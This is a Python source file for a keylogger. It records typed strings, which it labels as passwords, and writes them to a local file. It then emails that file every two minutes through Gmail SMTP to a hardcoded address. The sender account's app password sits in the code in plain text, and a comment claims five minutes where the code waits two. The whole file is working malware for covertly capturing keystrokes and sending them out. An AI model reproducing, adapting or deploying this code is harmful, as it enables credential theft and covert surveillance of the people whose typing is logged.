# ===================================================== Basic keylogger ================================================


import keyboard
import os


# Defining the text file name and path
path = os.path.abspath("keysniffer_data.txt")


def keylogger():
    try:
        while True:
            with open(path, "a") as data_file:

                # All key presses are recorded as a list into "events"
                # and the record loop stops when the "enter" key is pressed
                events = keyboard.record("enter")
                password = list(keyboard.get_typed_strings(events))

                data_file.write("\n")  # New line written before data is written
                data_file.write(password[0])
    except KeyboardInterrupt:
        print("Keylogger stopped.")


# ===================================================== Sending by email =========================================================


import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Email sender and receiver details
password = "ixtzymqtphizlcet"
sender_email = "7unkym0nk3y@gmail.com"  # email from the account
receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender

# File to attach
file_path = "keysniffer_data.txt"


def send_email():

    # Create the email object
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "File Attachment: keysniffer_data.txt"

    # Email body
    email_body = """<html><body><p>Please find the attached file keysniffer_data.txt.</p></body></html>"""
    message.attach(MIMEText(email_body, "html"))

    # Attach the file
    with open(file_path, "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={file_path}",
        )
        message.attach(part)

    # Send the email
    try:
        with smtplib.SMTP(
            "smtp.gmail.com:587"
        ) as server:  # Replace with your SMTP server and port
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")


def send_email_periodically():

    # Sends the keysniffer_data.txt file as an email attachment every 5 minutes.

    while True:
        send_email()
        time.sleep(120)  # Wait for 2 minutes


# ===================================================== Programm working =========================================================


import threading

# Run keylogger and send_email_periodically simultaneously using threads
if __name__ == "__main__":
    try:
        # Start the keylogger in one thread
        keylogger_thread = threading.Thread(target=keylogger, daemon=True)

        # Start the email sender in another thread
        email_thread = threading.Thread(target=send_email_periodically, daemon=True)

        keylogger_thread.start()
        email_thread.start()

        # Keep the main thread   alive
        keylogger_thread.join()
        email_thread.join()
    except KeyboardInterrupt:
        print("Program stopped.")
